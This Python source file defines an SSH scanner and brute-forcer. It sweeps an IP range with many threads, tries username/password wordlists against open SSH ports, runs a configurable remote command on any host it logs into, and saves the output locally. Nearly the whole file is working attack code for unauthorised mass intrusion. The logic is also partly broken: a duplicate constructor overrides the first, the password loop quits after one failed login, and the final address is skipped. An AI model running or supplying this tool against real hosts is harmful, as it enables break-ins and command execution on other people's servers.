import configparser
from itertools import count
import paramiko
from socket import *

import time
from threading import Thread

SSH_STATE = {"RUNNING":1,"END":0, "IDLE":2}
class SSHScan():

    def __init__(self, parser):

        
        self.iprange = parser.get("ssh_scan", "iprange")
        self.user_ssh_file = parser.get("ssh_scan", "userfile")
        self.pass_ssh_file = parser.get("ssh_scan", "passwfile")
        self.user_list = []
        self.pass_list = []
        self.ssh_linux_shellcode = parser.get("ssh_scan", "linuxshellcode")
        self.ssh_port = int(parser.get("ssh_scan", "port"))
        self.max_thread = int(parser.get("ssh_scan", "max_thread"))
        self.timeout = int(parser.get("ssh_scan", "timeout"))
        self.forced_exit = False
        self.thread_list = {}
    
    def __init__(self, 
                iprange, 
                user_ssh_file, 
                pass_ssh_file, 
                ssh_linux_shellcode,
                ssh_port,
                max_thread,
                timeout,
                verbose
                ):
        
        self.iprange = iprange
        self.user_ssh_file = user_ssh_file
        self.pass_ssh_file = pass_ssh_file
        self.user_list = []
        self.pass_list = []
        self.ssh_linux_shellcode = ssh_linux_shellcode
        self.ssh_port = int(ssh_port)
        self.max_thread = int(max_thread)
        self.timeout = int(timeout)
        self.forced_exit = False
        self.thread_list = {}
        self.verbose = verbose


    def _loadDictionary(self):
        ff = open(self.user_ssh_file, 'r')
        self.user_list = ff.readlines()
        ff.close()

        ff = open(self.pass_ssh_file, 'r')
        self.pass_list = ff.readlines()
        ff.close()

    def stop(self):
        self.forced_exit = True
    
    def _incIP(self,ip):
        a,b,c,d = ip.split(".")

        a=int(a)
        b=int(b)
        c=int(c)
        d=int(d)

        if d<255:
            d=d+1
        elif c<255:
            c=c+1
            d=0
        elif b<255:
            b=b+1
            d=0
            c=0
        elif a<255:
            a=a+1
            d=0
            c=0
            b=0
        return "{}.{}.{}.{}".format(a,b,c,d)



    def hack_ssh(self):
        counter = 1
        print("Scanning for ssh services...")
        startip,endip = self.iprange.split("-")
        startip=startip.strip()
        endip=endip.strip()
        
        while startip!=endip:
            if self.forced_exit:
                return

            if len(self.thread_list)>=self.max_thread:
                time.sleep(2)
            else:
                t = Thread(target=self._scan_ip, args=(startip,))
                t.start()
                self.thread_list[startip] = t
                startip = self._incIP(startip)


            counter = counter+1

        while len(self.thread_list)>0:
            time.sleep(3)
        print("Done!")

    def _scan_ip(self, ip):
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if self.forced_exit:
            return

        connSkt = None
        try:
            connSkt = socket(AF_INET, SOCK_STREAM)
            connSkt.settimeout(self.timeout)
            connSkt.connect((ip, self.ssh_port))
            print("[+] {}:{} open".format(ip,self.ssh_port))
        
        except:
            connSkt.close()
            del self.thread_list[ip]
            return
        finally:
            connSkt.close()
        
        for user in self.user_list:
            if self.forced_exit:
                return
            user = user.strip("\n")
            for psw in self.pass_list:
                if self.forced_exit:
                    return
                psw=psw.strip("\n")

                try:
                    print("Cracking SSH account ({}/{})...".format(user,psw))
                    ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
                    print("Sending command: {}".format(self.ssh_linux_shellcode)) 
                    stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)

                    
                    output=stdout.readlines()
                    print(output)

                    print("Close connection") 
                    ssh.close()
                    
                    ww = open(ip+".txt",'w')
                    for line in output:
                        ww.write(line)
                    ww.close()


                    del self.thread_list[ip]
                    return
                except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
                    ssh.close()
                    break
                except:
                    #print("Skip {}".format(ip))

                    del self.thread_list[ip]
                    return
        del self.thread_list[ip]
        

